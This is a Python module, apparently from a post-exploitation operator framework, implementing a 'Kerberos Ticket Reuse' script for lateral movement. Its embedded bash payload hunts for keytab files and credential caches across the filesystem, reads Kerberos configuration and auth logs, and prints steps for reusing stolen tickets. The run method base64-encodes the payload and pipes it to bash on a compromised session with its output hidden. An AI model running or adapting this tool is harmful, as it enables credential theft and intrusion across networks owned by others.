"""Kerberos ticket extraction and reuse script."""

from ..base import OperatorScript, ScriptResult


class KerberosReuse(OperatorScript):
    """Extract and reuse Kerberos tickets for lateral movement."""
    
    name = "Kerberos Ticket Reuse"
    description = "Extract and reuse Kerberos tickets"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] KERBEROS TICKET EXTRACTION"
echo "=============================="
echo ""

echo "[+] Checking for Kerberos configuration:"
if [ -f /etc/krb5.conf ]; then
    echo "[+] Found /etc/krb5.conf"
    cat /etc/krb5.conf | grep -v "^#" | grep -v "^$"
else
    echo "[-] No Kerberos configuration found"
fi
echo ""

echo "[+] Checking for active Kerberos tickets:"
klist 2>/dev/null || echo "[-] No Kerberos tickets or klist not available"
echo ""

echo "[+] Searching for keytab files:"
find / -name "*.keytab" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
    klist -k "$file" 2>/dev/null
done
echo ""

echo "[+] Checking ccache files (credential cache):"
find /tmp -name "krb5cc_*" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
    KRB5CCNAME="FILE:$file" klist 2>/dev/null
done
echo ""

echo "[+] Checking environment for Kerberos variables:"
env | grep -i krb
echo ""

echo "[+] Searching for Kerberos principals in common locations:"
find /home /root -name ".k5login" 2>/dev/null -exec cat {} \;
echo ""

echo "[+] Active Kerberos services:"
ps aux | grep -E "krb5kdc|kadmind|kpasswd" | grep -v grep
echo ""

echo "[+] Kerberos authentication logs:"
grep -i "kerberos\|krb5" /var/log/auth.log /var/log/secure 2>/dev/null | tail -20
echo ""

echo "[+] Instructions for ticket reuse:"
echo "  1. Export ticket: KRB5CCNAME=FILE:/tmp/krb5cc_XXXX"
echo "  2. Use with: kinit -k -t /path/to/keytab principal"
echo "  3. Verify with: klist"
echo "  4. SSH with: ssh -K target_host"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Extracting Kerberos tickets...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Kerberos ticket extraction executed",
                metadata={"script": "kerberos_reuse"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
